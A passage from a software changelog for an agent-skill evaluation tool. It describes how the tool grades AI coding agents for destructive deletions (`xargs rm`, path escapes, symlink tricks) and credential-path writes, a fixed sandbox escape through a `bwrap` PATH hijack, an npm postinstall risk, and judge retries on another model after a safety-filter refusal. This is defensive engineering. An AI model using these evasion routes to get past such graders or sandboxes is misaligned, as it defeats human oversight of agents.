  destructive-command findings with a security score of 0.0; unlinking a
  final leaf remains exempt. This conservative signal applies across the
  trace, including after link moves or replacements, without inspecting the
  filesystem or proving a link's destination or creation success. Unobserved
  or pre-existing symlinks are not detected by this policy. Lexical path escapes
  and unresolved or `xargs`-supplied deletion targets remain flagged. Searches,
  script arguments, and unexecuted heredoc data do not supply link evidence;
  Python and Node call syntax is inspected only in executable inline source
  or a recognized program supplied directly through standard input. Comments
  containing apostrophes do not hide actual link calls. Later and multiple
  heredocs, `cat` pipelines into interpreters, and common shell startup options
  retain link detection. Plain `;`, `&&`, `||`, and newline sequences apply
  evidence in command order, so later link creation does not regrade earlier
  cleanup in the same call. Loops, functions, traps, background jobs and other
  compound syntax keep conservative whole-action evidence; unrelated link
  creation can still affect later nested cleanup and remains a policy tradeoff.
- Tier 3 security grading no longer grants temporary-cleanup exemptions to
  destructive `rm` commands launched through `xargs`, whose additional targets
  may come from standard input or an argument file. Both graders recognize
  common options and wrappers while preserving separate cleanup commands.
  Input contents are not evaluated, so this conservative policy also flags
  legitimate scoped cleanup such as
  `find /tmp/cache -name '*.pyc' | xargs rm -f` as a critical destructive-command
  finding with a security score of 0.0.
- Tier 3 security grading now normalizes deletion targets before exempting
  temporary-directory cleanup. Paths such as `/tmp/../workspace` and commands
  mixing temporary and non-temporary targets receive destructive-command
  findings in both the host checker and bundled Harbor verifier. Destructive
  `rm` fragments with no parsed target are also flagged, preserving detection
  of deletions assembled from strings. Temporary cleanup inside backtick
  command substitutions, or followed by shell comments and file-descriptor
  redirections, no longer produces false destructive-command findings. Targets
  after heredoc and here-string redirections are still checked; the input word
  of a redirection is not treated as a deletion target.
  Case-arm/subshell terminators and unrelated comments, ANSI-C literals, or
  heredoc data no longer remove the cleanup exemption. Command substitutions
  used as redirection words do not hide later deletion targets. Unquoted
  `/tmp` deletion targets containing variables, command substitutions, or
  brace expansions (for example standalone `rm -rf /tmp/build-$$`) no longer
  get the cleanup exemption because their destinations remain unresolved.
  Operandless `xargs rm` invocations remain detectable when unrelated syntax
  or parser budgets prevent a complete parse; the fallback uses a bounded
  command span to avoid excessive backtracking on long actions.
- Tier 3 error recovery now scores unrecovered command failures as zero and
  includes them in fault counts and failure verdicts/report reasons. Host and
  bundled verifier detection agree and use a result's execution status when it
  has one: a Codex exit code, a whole `exit code N` line, or Harbor marking a
  Claude Code result as successful. Only results without a status, such as
  OpenCode's, are judged by their text: tracebacks, `error:` lines, pytest,
  jest, go test, tsc and npm failures and OpenCode's timeout note count, while
  `0 errors`, exception handlers, numeric timeout settings and type annotations
  do not. Exit-1 probes with no other output (`grep`, `rg`, `test`, `diff`,
  `cmp`, `command -v`, `which`, `git diff --quiet`, including `grep -c` zero
  counts, `/dev/null` redirects, a leading `cd` or `pwd` and pipelines) remain
  clean. Recovery matches whole command words after a leading `cd`; beyond the
  original five-call retry window, only a successful repeat of the same command
  and arguments counts.
- Catalog validation now includes nested and lowercase skill manifests, skips
  generated directories, and stops at skill boundaries to avoid validating
  bundled templates as separate skills. External linked directories containing
  skills and unreadable directories appear as failures without stopping other
  skills; links back into the catalog are ignored. Linked manifests retain
  direct-target behavior, plugin discovery errors produce findings, and reports
  and external Tier 3 results preserve catalog-relative paths for skills with
  the same basename.
- Tier 3 runs now write a Tier 3-scoped `tier3-benchmark.md` alongside HTML,
  named so publication tooling does not treat it as a `BENCHMARK.md` card. It
  states that Tiers 1 and 2 are not covered by the report, separates the Tier 3
  result from an unassessed publication decision, and displays a completed
  agent's score and comparable lift when another agent fails. Failure warnings and the full publication checks remain unchanged.

- Changing finding severities through a policy no longer clears an independent
  quality-score threshold failure. A score below `--min-score` still fails,
  and its reason appears in the terminal, HTML, benchmark, and JSON reports.
- Tier 3 on Windows passes `PROGRAMFILES`, `PROGRAMW6432` and `PROGRAMDATA` to
  Harbor, so Docker Desktop finds its `compose` plugin, and passes
  `PYTHONUTF8` and `PYTHONIOENCODING` so Python UTF-8 mode reaches Harbor on
  non-UTF-8 locales.
- On native Windows, generated Tier 3 `test.sh` files and the grader starters
  from `init-custom-grader` and `init-harbor-task` are now written with LF line
  endings. They were written with CRLF, which broke the `#!/bin/bash` shebang
  and `set -euo pipefail` in the Linux container, so the verifier failed
  before grading. The repository's `.gitattributes` also keeps `*.sh` files LF
  in Windows checkouts.
- A `SKILL.md` `metadata` value that is not a mapping, such as `true`, `1.5`, a
  date, or a list or string containing `author` or `tags`, no longer crashes
  the quality check with a `TypeError`, which aborted `validate`, `tier1`, and
  `quality-check` before any report was written. The schema check reports the
  malformed `metadata`, and the quality score counts `metadata.author` and
  `metadata.tags` as missing, as it already did for other non-mapping values.
- A `SKILL.md` over the recommended 5,000-token budget now gets a MEDIUM
  `quality_efficiency` finding instead of a HIGH one. The HIGH finding failed
  the quality check, and with it `validate`, `tier1`, and `quality-check`, even
  when the quality score met `--min-score`. The 15-point Efficiency deduction is
  unchanged, so a large skill still fails when its score falls below the
  minimum.
- `--llm` security scans on the `nv_build` provider now run SkillSpector with
  `SKILLSPECTOR_PROVIDER=nv_build` instead of `openai`, so SkillSpector sizes
  requests from its NVIDIA Build model registry. A Build model with a smaller
  output cap, such as `openai/gpt-oss-120b` (16,384 tokens), no longer gets
  SkillSpector's 32,000-token fallback budget, which can exceed what the
  endpoint accepts and leave the LLM security stage incomplete. An explicit
  `SKILLSPECTOR_PROVIDER=nv_build` gets the same mapping. The key still reaches
  SkillSpector only as `OPENAI_API_KEY`, with `OPENAI_BASE_URL` set to the
  public Build endpoint.

### Security

- Refresh locked AnyIO, certifi, and PyJWT dependencies used by source and CI
  installations, and update Streamlit and Pillow for the optional dashboard.
  Published package dependency ranges are unchanged.
- Plugin inventories and findings now redact credentials embedded in declared
  component paths, including invalid or unsafe references, before recording
  their names, locations and metadata.
- Linux local mode now launches Bubblewrap by the absolute path that passed its
  smoke test instead of a bare `bwrap`. The bare name was looked up on the host
  `PATH` for every command, from that command's working directory (the
  writable trial workspace by default), so a relative `PATH` entry such as `.`,
  an empty entry, or `./node_modules/.bin` let a `bwrap` file created by an
  earlier sandboxed command run outside the sandbox. A `bwrap` symlink on
  `PATH` is resolved to its target before the smoke test, and the local-mode
  isolation message names that resolved path.

### Development

- The staged Harbor verifier reuses the shared log-secret redactor, guarded
  by the Python 3.9 verifier smoke check.
- Python 3.13 and 3.14 CI test jobs run in parallel with `pytest -n auto`;
  the Python 3.12 coverage job remains serial.
- Streamed-execution cleanup tests wait for descendant processes to exit
  before asserting termination, avoiding a race on macOS.

## 0.6.0 - 2026-10-20

### Added

- Optional `skillevaluator dashboard` tables for comparing saved Tier 3 reports
  and retained runs across skills, models, harnesses, recorded harness
  features, and skill conditions. Paired with/without differences cover score,
  pass@k, tokens, and agent execution time, plus USD cost when retained runs
  record it; the performance table also shows per-trial means alongside
  totals. Comparisons require matching complete trial coverage (repeated
  attempts pair by case, as in the HTML report) and name the reason when a
  pair is not comparable. Inputs are read once and reused between
  interactions (**Reload reports** re-reads them); browser uploads are limited
  to 16 MB. Install it with the `dashboard` extra.
- Tier 3 support for Harbor GKE execution mode (`--env-mode gke`) and `--ek`
  argument forwarding. API keys, bearer tokens, and passwords passed in `--ek`
  keys or values are rejected to keep credentials out of process listings, while
  configuration such as rate limits and token counts is preserved. Cluster
  infrastructure settings in skill configs are rejected to enforce security
  boundaries in favor of host environment variables and CLI flags.
- Claude Code live agent routing for Google Cloud Vertex AI
  (`CLAUDE_CODE_USE_VERTEX=1`, `ANTHROPIC_VERTEX_PROJECT_ID`, `CLOUD_ML_REGION`),
  with redirect-blocking preflight probes, case-insensitive model alias
  resolution, and explicit trusted-skill opt-in (`SKILLEVALUATOR_GKE_ALLOW_WORKLOAD_IDENTITY=1`
  or `--ek allow_workload_identity=true`) when using single-pod GKE Workload Identity.
- Fail-closed validation for skill-authored MCP server configurations
  (`evals/environment/mcp_servers.toml` and `mcp_servers.json`) that blocks
  operator/provider credential references and literal secrets, while allowing
  operator-approved MCP endpoints and non-LLM secrets via
  `SKILLEVALUATOR_ALLOWED_MCP_HOSTS` and `SKILLEVALUATOR_ALLOWED_MCP_SECRETS`.
- The HTML report's Tier 1 card now shows the SkillSpector version that ran
  the security scan (for example `SkillSpector v2.12.0`), and the embedded
  report JSON records it as `skillspector_versions`. Findings depend on the
  scanner release, so reviewers can tell which SkillSpector produced them
  without rerunning the scan. The version is shown even when the report omits
  its timestamp.
- `--env-mode kata` runs Tier 3 trials through the hardened Docker backend with
  every task service in a Kata Containers microVM. It requires a Linux host with
  `/dev/kvm` and a Kata runtime registered with Docker, and accepts only the
  `kata_runtime` and `kata_dns` environment kwargs. Image builds still run on
  the host, and tasks with Compose sidecars are rejected.
- `--env-mode runta` and `--env-mode mosaic` run Tier 3 trials on Harbor's Runta
  and Mosaic backends. Runta's `mode` and Mosaic's `volume`, `persist`,
  `enable_ssh`, `build_args`, and `build_target` kwargs are reserved because they
  bypass the task image or let state and access outlive one isolated trial.

### Changed

- SkillSpector now has its own default model per provider instead of
  following the chat default, so chat-default upgrades no longer reach
  SkillSpector before it supports them. An explicit `SKILL_EVAL_LLM_MODEL`
  still reaches it, and `SKILLSPECTOR_MODEL` still overrides both. The bridge
  forwards your `SKILLSPECTOR_MODEL_<SLOT>`, `SKILLSPECTOR_MODEL_REGISTRY` and
  `SKILLSPECTOR_REASONING_EFFORT` settings (never `SKILLSPECTOR_TEMPERATURE`),
  defaults the reasoning effort to `medium` for GPT-6 models, and records the
  requested `skillspector_model` and `skillspector_reasoning_effort` next to
  `skillspector_version` in the security result.
- Install instructions and the missing-scanner hint now pin SkillSpector to
  `v2.12.0` instead of its default branch.
- GPT-6 models get the GPT-5 request shape everywhere SkillEvaluator calls a
  model: no `temperature`, and `max_completion_tokens` on the native OpenAI
  endpoint. Gateway catalog IDs such as `aws/anthropic/bedrock-claude-opus-5`
  are recognized as the Claude model they name.
- Output-token limits are sized per model family. OpenAI reasoning models get
  at least 32,768 tokens; other models get 16,384 for `--llm-verify`, rubric
  evaluation, deduplication verdicts and judges, 8,192 for report suggestions
  and 16,000 for dataset generation. On the Anthropic API, Claude Opus 4 and
  4.1 stay at the 8,192 tokens the Anthropic SDK allows without streaming.
- Reasoning effort is sent only to GPT-6 models and to Claude 5.5 or later on
  the Anthropic API: `high` for `--llm-verify`, `medium` for rubric evaluation,
  deduplication verdicts and judges.
- Rubric evaluation and deduplication verdicts request structured output. The
  verifier and deduplication prompts ask for `rationale` instead of
  `reasoning`; replies that still say `reasoning` are accepted.
- The `goal_accuracy` RAGAS scorer is skipped for GPT-5 and GPT-6 judges, which
  reject its sampling settings.
- `run_config.json` records the judge reasoning effort, and each standard
  judge's details record `judge_model_used`, `judge_reasoning_effort` and
  `judge_fallback_used`. Skill lift leaves out a case whose two conditions were
  judged by different models and counts it in `judge_mixed_cases`.
- Removed the unused `CONTENT_DEDUP_LLM_*` constants and `LLM_VERIFY_MODEL`; an
  LLM client built from explicit credentials uses the provider default model.
- Tier 3 pins the agent CLIs Harbor installs: Codex 0.161.0 and Claude Code
  2.1.292, instead of the latest release. Claude Code runs Claude 5.5 and later
  models with `reasoning_effort=medium`; Codex keeps `high`. Local mode keeps
  your installed CLIs and fails a trial early when they are too old for the
  model: Claude 5.5 needs Claude Code 2.1.280 or newer, and GPT-6 needs Codex
  0.159.1 or newer.
- OpenAI-compatible gateway agent defaults: Codex moves to
  `openai/openai/gpt-6.1-sol` and Claude Code to
  `aws/anthropic/bedrock-claude-opus-5-5`. OpenCode stays on
  `nvidia/nvidia/nemotron-3-super-120b-long-ctx`, no longer tied to the gateway
  chat default. Claude Code on the shared gateway key runs with
  `CLAUDE_CODE_DISABLE_EXPERIMENTAL_BETAS=1`, so gateways that forward to
  another provider do not reject its pre-release request fields.
- The OpenAI default model moves from `gpt-5.6-sol` to `gpt-6.1-sol` for chat,
  judging, Codex and SkillSpector, which runs it at `medium` reasoning effort,
  so the effort values above apply to the OpenAI defaults. OpenCode keeps
  `openai/gpt-5.6-sol` unless `SKILL_EVAL_LLM_MODEL` is set, because
  GPT-6.1 Sol supports tool calls only on the Responses API.
- The Anthropic and Bedrock default models move from Claude Opus 5 to Claude
  Opus 5.5 (`claude-opus-5-5` and `us.anthropic.claude-opus-5-5`) for chat,
  judging and Claude Code. On the Claude API they get the effort values above
  and server-side refusal fallback, and Claude Code runs them at
  `reasoning_effort=medium`.
  SkillSpector stays on `claude-opus-5` and `us.anthropic.claude-opus-5`, which
  SkillSpector v2.12.0 supports.
- Docker Claude Code and Codex containers no longer get the distribution
  `nodejs` and `npm` packages from agent setup, except on Alpine images. On
  Debian-based images, including the default eval image, those packages also
  provided `npx`, `gcc`, `g++`, and `make`. Claude Code containers now have no
  Node.js unless the image provides it, and Codex's own Node.js is on `PATH`
  only for the Codex process. Skills whose scripts, tasks, or stdio MCP servers
  need these tools must install them through `scripts/apt-packages.txt` or a
  custom `evals/environment/Dockerfile`.
- Exposed `kata`, `runta`, and `mosaic` as the 24th, 25th, and 26th Harbor 0.24
  backends alongside local mode. `cua-cloud`, `opensandbox`, `hf-sandbox`,
  `podman`, `prime`, and `smol` remain disabled.
- The public benchmark gate (`scripts/ci/check_public_benchmarks.py`) now
  requires a `PASS` card to record its `Source digest` and `Tier 3 run ID`.
  `PASS` cards rendered by earlier releases fail the scan until they are
  regenerated; earlier `FAIL`, `NEUTRAL`, and `INCOMPLETE` cards without those
  lines are still accepted, and the lines are validated whenever present.
- Report output must be outside the publication target. An explicit
  `--output-dir` inside the evaluated skill is now rejected; use an external
  directory. A default in-target `reports/` location relocates to an
  authenticated sibling `<skill>-reports` (or `<catalog>-reports`), refuses
  unowned collisions, and is excluded from Tier 3 runtime staging. Report roots
  inside the target repository or an included-skill root are excluded from
  linked or full-repository context only after they are reserved or
  authenticated as generated output, so an authored subtree is never silently
  omitted.
- A custom Tier 3 `--results-dir` inside the evaluated skill is now rejected;
  use the canonical `evals/results` path or an external results root.
- `validate --block-on-agent-eval` now passes the exit gate only for a completed
  Tier 3 `PASS` verdict with complete attempt coverage. `NEUTRAL` and `FAIL`
  verdicts exit 1; previously any completed, scored run passed.

### Fixed

- Tier 3 reports an inconclusive result when every observed positive with-skill
  trial has zero activation, and omits skill-lift comparisons for that agent.
  Activation counts are reported separately; negative controls and missing
  evidence do not imply that the skill was never loaded. The skill-execution
  score is zero when positive activation fails, so unrelated successful checks
  cannot inflate it to 0.5 (fixes #208). Benchmark cards and dashboard comparisons
  preserve this eligibility rule, and multi-agent HTML labels explain why lift
  is unavailable. Mixed-agent reports retain advice from the best eligible
  agent without attributing never-activated trials to skill quality.
- Tier 3 now uses one versioned, equal-weight five-dimension overall-score
  policy across Harbor rewards, pass@k, Skill Lift, reports, comparisons, and
  best-agent selection. Previously, some paths averaged all six evaluators
  directly while reports averaged five dimensions, which gave Effectiveness
  two votes and could reverse the reported lift direction. Current artifacts
  persist `skill-evaluator-dimension-mean-v1`; legacy and partial artifacts
  retain their historical semantics. Conditions keep their own recorded metric
  sets; overall lift and best-agent rankings are omitted across different
  standard metric sets while individual scores are preserved, and
  `tier3 compare` refuses standard agents with different policies or metric
  sets. Custom-only agents keep their grader's own overall and are ranked and
  compared against standard agents
  (Relates to [#61](https://github.com/NVIDIA/SkillEvaluator/issues/61)).
- Preserve explicit Claude and OpenCode read failure metadata in reconstructed
  ATIF trajectories. Failed isolated SKILL.md reads and failed native Skill
  calls lose credit; compound shell failures and shell reads whose path may
  expand to several files (braces, globs, `$` or backticks) remain ambiguous
  and retain prior credit in host and verifier grading. Unattributed errors do
  not cancel successful reads, and shell reads count dash-prefixed filenames
  after `--`.
- Tier 1 pyproject dependency audits now inspect static target declarations
  rather than the evaluator environment. Exact direct pins (including optional
  groups) are queried without installation or build-script execution;
  unresolved declarations and invalid scanner evidence are incomplete.
- Tier 1 PII scanning now includes `.mdc` rules and workflows.
- Tier 3 negative-case accuracy excludes inapplicable skill identification and
  records its scoring policy. Reports separately expose measured token and
  agent execution-time differences with complete matching-arm coverage, while
  efficiency continues to measure routing and productive tool use.
- Derive accuracy scores from complete criterion verdicts in both judge
  runtimes (passing applicable criteria divided by applicable criteria), so an
  inconsistent model-supplied total cannot distort Skill Lift. Correct the
  Harbor prompt example to score five passing criteria as 1.0.
- Include schema-valid ATIF message content parts in final answers, conversation
  summaries, and judge evidence references in the host and Harbor verifier.
  Image and audio parts use markers without exposing their source paths.
- Preserve scored Harbor trials when agent answers mention authentication errors
  and per-step token usage is present but aggregate ATIF token metrics are absent
  or zero. Explicit runtime exceptions and error events still invalidate trials.
- Safety-classifier refusals, content filters and output-token truncation are
  detected instead of being read as empty or malformed output. `--llm-verify`
  and rubric evaluation report the cause, and `--llm-verify` keeps the
  complete verdicts of a truncated reply. Claude 5.5 or later requests to the
  native Claude API use server-side fallback to Claude Opus 4.8. In the Harbor
  verifier, Bedrock retries a filtered Claude 5.5 reply on Claude Opus 4.8, and
  a refusal or empty judge reply moves on to the next
  `LLM_JUDGE_FALLBACK_MODELS` entry.
- The Harbor verifier's last-resort judge model follows the selected provider.
  With no judge or chat model configured, it used to request an OpenAI model
  from Anthropic, Bedrock, NVIDIA Build and gateways. The unused host-side
  `llm_judge.DEFAULT_JUDGE_MODEL` constant is removed.
- Fixed Docker Codex and Claude Code setup wasting its timeout installing
  distribution Node/npm before Harbor's own installers. Native, gateway Codex,
  and NVIDIA Build agents now provision Node/npm only on the installer branches
  that need them, while preserving installed-agent and version-pin checks.
- Preserved multiline skill descriptions when saving and loading Tier 2
  embedding catalogs. Descriptions can contain line breaks and tabs, while
  catalog identifiers and other control characters remain strictly validated.
- Brought the published documentation in line with 0.5.0. It now covers how
  standard grading builds judge evidence and rebuilds trajectories from
  OpenCode and Codex logs, structured judge output and retries, the evidence
  budget and judge time-budget variables, and the Harbor process environment.
  The CLI reference adds `validate --workers`, the full `--env-mode` list, and
  the exit codes the CLI actually returns (`0`, `1`, `2`).
- `BENCHMARK.md` publication verdicts now require completed Tier 1 and Tier 2
  execution evidence by default (Tier 1 must cover every default check that
  applies to the content type, so a run narrowed with `--checks` cannot
  certify publication), conservatively resolve conflicting peer
  policy and Tier 3 result metadata, bind every tier and policy claim to one
  versioned source-tree digest, preserve the Tier 3 run ID, persist an explicit
  publication status in JSON and HTML, and reject
  publication `PASS` cards whose decision evidence is missing, incomplete,
  linked, or hidden in raw HTML. Tier 3 evidence now cross-checks complete
  per-condition attempt and error records, and the public-card gate rejects
  ambiguous structural headings, browser-rendered decision-text aliases, and
  literal or entity-encoded Unicode control/format characters. The source
  identity is read without following links before and after each producer,
  follows the host filesystem's case aliases, and records a bounded
  source-change marker. Tier 3 runs that stage repository context, external
  reference or workspace skills, or task inputs with `.git`, `.venv`,
  `__pycache__`, or `node_modules` entries remain runnable but cannot certify
  publication, and neither can a target whose authored paths below the root
  use names that Tier 1 skips (such as `references/results/`).
- Clean and not-applicable License, Code Risk, Secrets, and Dependency Audit
  runs now record structured execution evidence, so legitimate built-in Tier 1
  results can satisfy publication without relying on findings or errors.
- Skip reasons are bounded, control-free, and escaped in reports and in the
  terminal, so oversized metadata, Rich markup, or terminal escape sequences
  cannot corrupt them. Reports show one line; the pipeline view keeps the
  reason's line breaks.
- SkillSpector issue paths with NUL bytes or lone surrogates now make the
  security scan incomplete instead of being accepted.
- The public benchmark gate rejects `PASS` cards with placeholder identities,
  malformed or future evaluation dates, a missing Tier 3 run ID, hostile
  benchmark-policy metadata, or environment-label substitutions in required
  proof fields.
- Hardened Tier 3 HTML and Markdown reporting against recursive or malformed
  display metadata, Markdown structure injection, and inline-JavaScript
  injection through untrusted agent or skill names.

### Security

- The docs-publishing workflow, the only one that passes a secret to a step,
  now pins `actions/checkout` to a commit SHA, declares
  `permissions: contents: read`, and sets `persist-credentials: false`.
  `dco.yml` no longer persists checkout credentials either.
- Docs are now published with the same Fern CLI version they are validated
  with. Both workflows install the CLI from `fern/package.json` and its
  committed lockfile; a test checks that the pin matches `fern/fern.config.json`.
- Workflow hardening guards now glob `.github/workflows/` instead of a
  hardcoded two-file list, so every workflow — including any added later — must
  pin each action to a commit, avoid persisting checkout credentials, and
  declare a `permissions:` block. The guards also cover job-level
  `permissions:` overrides and job-level reusable-workflow `uses:` references,
  neither of which the step-level checks reached.
- The Fern CLI is now installed from a committed lockfile, `fern/package-lock.json`,
  with `npm ci --prefix fern --ignore-scripts --omit=optional`, and both workflows
  invoke `./fern/node_modules/.bin/fern` rather than a binary on `PATH`. Previously
  `publish-docs.yml` ran `npm install`, which re-resolves every transitive
  dependency from semver ranges on each run: pinning `fern-api`'s own version
  pinned nothing beneath it. `@scarf/scarf` — reached through `fern-api`'s
  optional dependency on `@boundaryml/baml` — declares a `postinstall` script.
  The install step did not receive `FERN_TOKEN`, but its resulting CLI was later
  run in the token-bearing publish step. The lockfile pins every package to an
  exact version and integrity hash, `--ignore-scripts` stops lifecycle code
  running, and `--omit=optional` (which npm honours for this local install, but
  silently ignores for a `--global` one) leaves `fern-api` alone in the tree.
  Guards now permit only the reviewed lockfile install command in workflows,
  check the Fern manifest and lockfile dependency inputs, and require
  `fern/package.json`, `fern/package-lock.json`, and `fern/fern.config.json` to
  name the same CLI version. Fern dependency and config changes run the full
  CI lane, including dependency review, while `fern check` runs in both lanes.
  The developer-facing install instructions
  (`docs/README.md`, `docs/AGENTS.md`, `docs/developer-guide.mdx`) use the same
  lockfile install, so a contributor or agent following them gets the tree CI runs.
- The action-pinning guard now accepts a same-repo composite action or
  reusable workflow (`uses: ./...`) without requiring a commit SHA, since
  GitHub always resolves a local reference from the caller's own commit and
  nothing about it can float. A local reference that escapes the repository
  (e.g. `./../outside`) or carries an `@ref` (a syntax local references don't
  have) is still rejected, and a `docker://` reference is unaffected by the
  exemption.

## 0.5.0 - 2026-10-06

### Added

- Transparent HTTP 429 (rate-limiting), transient 5xx, and timeout recovery for
  LLM judges in both the Harbor container verifier (`eval.py`) and host runtime
  (`LLMClient`). Features zero-dependency full jitter exponential backoff,
  RFC-7231 `Retry-After` header parsing, finite-value environment overrides
  (`SKILL_EVAL_LLM_MAX_RETRIES`, `SKILL_EVAL_LLM_RETRY_BASE_DELAY`, and
  `SKILL_EVAL_LLM_RETRY_MAX_DELAY`), and
  automatic container forwarding via Harbor `task.toml`, and a per-judge
  verifier time budget that leaves room for failure artifacts, without altering
  benchmark metrics or scoring formulas.
- Provider-aware structured JSON schema enforcement (`response_format` for
  OpenAI-compatible / Gemini Vertex / NVIDIA NIM endpoints and `output_config`
  for Anthropic `/v1/messages`) across the custom `judge_accuracy`,
  `judge_goal_accuracy`, and `judge_behavior_check` paths, with automatic
  schema-specific `HTTP 400`/`422` downgrade and per-target memoization
  (`_SCHEMA_UNSUPPORTED_TARGETS`), boolean prompt alignment, and a guard for
  missing `message` fields on reasoning token exhaustion. The canonical OpenAI
  RAGAS goal scorer retains its separate scoring path.
- Configurable evidence bundle budgets (`SKILL_EVAL_ACCURACY_BUDGET`, `SKILL_EVAL_GOAL_ACCURACY_BUDGET`, `SKILL_EVAL_BEHAVIOR_CHECK_BUDGET`) and final response limit (`SKILL_EVAL_BEHAVIOR_FINAL_RESPONSE_LIMIT`).
- Tier 3 log converters now rebuild ATIF trajectories from OpenCode JSON streams
  (`opencode.txt`) and structured Codex tee logs (`codex.txt`) when
  `trajectory.json` is missing or empty.

### Changed

- Upgraded the optional Tier 3 backend to Harbor 0.24.0 and its compatible
  LiteLLM 1.92-1.93 window. Existing SkillEvaluator agent and environment
  options now use Harbor's unified selectors; installed Codex adapters preserve
  merged user and MCP configuration; Docker and local execution stream redacted
  callbacks under a shared 16 MiB per-command output limit, while the parent
  Harbor orchestration process has a separate 16 MiB combined stdout/stderr
  limit; and Docker supports stdin plus isolated sidecar operations without
  exposing environment values on Compose argv. Generated schema 1.3 and
  unmodified native task schemas remain compatible, while collection accepts
  Harbor 0.24 job, trial, reward, and ATIF v1.8 artifacts. Multimodal tool
  output reaches judges and reports as text with `[image]`/`[audio]` markers.
  Native tasks' own test scripts must write numeric `reward.json` values, which
  Harbor 0.24 enforces; a failed job now names the trial or step exception that
  Harbor recorded.
- Exposed 23 Harbor 0.24 backends alongside local mode. `cua-cloud`,
  `opensandbox`, `hf-sandbox`, `podman`, `kata`, `runta`, `prime`, `mosaic`,
  and `smol` remain disabled until generated tasks can be projected through a
  trusted image or backend-native provisioning path. Non-secret backend
  constructor options can be supplied with repeatable, operator-only
  `--environment-kwarg` / `--ek` flags; skill-owned configuration,
  credentials, and sandbox-policy overrides remain outside that surface.
  Harbor's `stream` and `enable_environment_dir_upload` options are reserved,
  and Modal's `modal_sandbox_v2` option no longer exists.
- `--env-mode wandb` now runs Harbor's `cwsandbox` backend with W&B
  authentication, because Harbor 0.24 merged the two. Install
  `harbor[cwsandbox]==0.24.0` instead of the removed `harbor[wandb]` extra.
- Harbor now always starts in an empty, evaluator-owned working directory with
  `.env` loading and Harbor telemetry disabled. A `.env.local` or `.env` file
  near the operator's project can no longer add credentials or settings that
  SkillEvaluator's allowlisted environment removed. The `tier3` extra requires
  python-dotenv 1.2.0.
- Codex runs with `reasoning_effort=high`, the default under Harbor 0.22, so
  scores and cost stay comparable after Harbor stopped pinning it.
- Native tasks follow Harbor 0.24's separate-verifier precedence. A dedicated
  verifier image or build definition must ship its own test script and never
  receives SkillEvaluator's grader. Otherwise the verifier is built from
  `environment/`, whose Compose model must stay within the verifier's
  environment allowlist. `docker-compose.yml` verifier definitions, which
  Harbor ignores, are rejected.

### Fixed

- Report non-string YAML keys as validation errors in skills, rules, workflows,
  and plugin manifests instead of raising a `TypeError`, including frontmatter
  `metadata` keys. Show boolean, null, and date keys in a readable YAML form.
- Harbor ``result.json`` case ids now prefer canonical ``task_id.path`` metadata
  over repository-prefixed ``task_name`` values when resolving eval entries.
- Codex log synthesis maps ``web_search`` action payloads and ``collab_tool_call``
  thread items into ATIF, and error-recovery checks recognize ``status=failed`` /
  ``exit_code=`` terminal evidence emitted by Codex converters.
- Tier 3 Harbor dual-arm evaluation propagates arm suffixes (`-with-skill`,
  `-without-skill`) to `[task] name` in staged native `task.toml` files,
  normalizes external repository and namespace prefixes, and commutatively
  resolves canonical case IDs across attempt and arm suffix combinations
  while preserving expected case IDs.
- Tier 3 native-task collection now keeps Harbor's staged directory selector,
  logical dataset ID, and display name separate; ambiguous or unresolved
  persisted identities fail closed instead of trusting grader-authored IDs.
  Runner-owned attempt ordinals are carried structurally, so `attempt`-like
  text in authored selectors, logical IDs, or display names cannot corrupt
  pass@k or `stop_on_pass` accounting, including truncated aggregate names.
- Tier 3 Harbor subprocess, Docker, and local diagnostics now redact raw and
  percent-decoded URI/proxy userinfo components across streamed callbacks,
  nonzero exits, timeouts, output limits, and persisted launch errors.
- Tier 3 local OpenCode runs routed through NVIDIA Build now retain the rendered
  user instruction for ATIF conversion and fail on OpenCode error events, in
  parity with Harbor's upstream agent lifecycle. Remote MCP servers in that
  configuration disable OAuth, as Harbor's own OpenCode configuration does.
- Tier 3 reports now use the collector's logical attempt overall whenever a
  condition mixes standard and custom rewards, including across separate
  trials, and aggregate execution summaries preserve child-declared hidden
  error counts and truncation through launch-error overlays.
- Tier 3 now rejects non-finite, overflowing, and finite-but-unscalable timeout
  multipliers at YAML, programmatic, and Harbor command boundaries.
- Tier 3 now preserves paired baseline isolation by rejecting skill-owned
  pre-agent setup, native task/step healthchecks, native step workdir overlays,
  and Harbor task-shipped prior trajectories whenever the baseline arm is
  enabled. Native standard grading also fails closed on step test overlays,
  separate verifier contexts, post-agent collect hooks, and task-controlled
  verifier executable-path, shell, loader, proxy/TLS, provider, and judge
  environment controls; exact operator-staged provider/judge placeholders and
  unrelated verifier variables remain compatible. Operator-configured judge
  fallback models are forwarded only to standard verifier jobs, not agent or
  `custom_only` environments. Its Python payload now runs from a replaced
  evaluator-owned directory in isolated mode. `custom_only`
  retains Harbor-native collect hooks and Harbor's shared/separate
  step-test resolution, and fully authored native test paths are left untouched
  instead of replacing their unused `tests/skill_evaluator/` package.
  All native grading modes reject Windows agent or effective verifier
  environments until evaluator projection and verifier scripts are OS-aware.
- Tier 3 collection now fails closed on unsafe reward identities and malformed
  custom-metric contracts, publishes exact truncation metadata for bounded
  case and failure-detail samples, and keeps findings, attribution, and
  per-trial JSON inside the report loader's artifact envelope.
- Tier 3 progress output, diagnostics, and result summaries no longer redact
  counts such as `0/1 scored` or `1 errored` when a credential-named
  environment variable holds a short flag value such as `1`. Short credential
  fragments in proxy URLs are still redacted.
- `create-eval-dataset --refine` no longer requires the `tier3` extra to read
  case IDs from Harbor result files, and no longer fails on multimodal
  trajectory messages.

## 0.4.0 - 2026-09-30

### Fixed

- Render untrusted skill content, paths, tool messages, and LLM output literally
  in CLI reports and logs. Escape Rich markup and strip terminal control
  sequences to prevent rendering failures and misleading output, including
  catalog summaries and the compact validation view. Preserve Windows paths
  and literal emoji codes
  ([#173](https://github.com/NVIDIA/SkillEvaluator/pull/173),
  [#175](https://github.com/NVIDIA/SkillEvaluator/pull/175)).
- Make sensitive-assignment, JWT, and private-key redaction linear-time,
  preventing long adversarial text from stalling logs and reports. Apply the
  JWT fix to Tier 3 command output and the bundled Harbor verifier
  ([#172](https://github.com/NVIDIA/SkillEvaluator/pull/172),
  [#176](https://github.com/NVIDIA/SkillEvaluator/pull/176)).
- `--no-llm` full datasets include a negative bucket only when eval guidance
  supplies an off-skill prompt; template mode no longer guesses canned
  negatives from a fixed question list. CLI and docs now describe `--full` as
  up to four cases instead of always four.
- Treat `apply_patch` file headers (`*** Add File:`, `*** Update File:`, `*** Delete File:`,
  `*** Move to:`) as write targets in the Tier 3 security check. A patch that targets a shell
  profile, SSH, credential, or privileged config path, sent as an `apply_patch` tool call or a
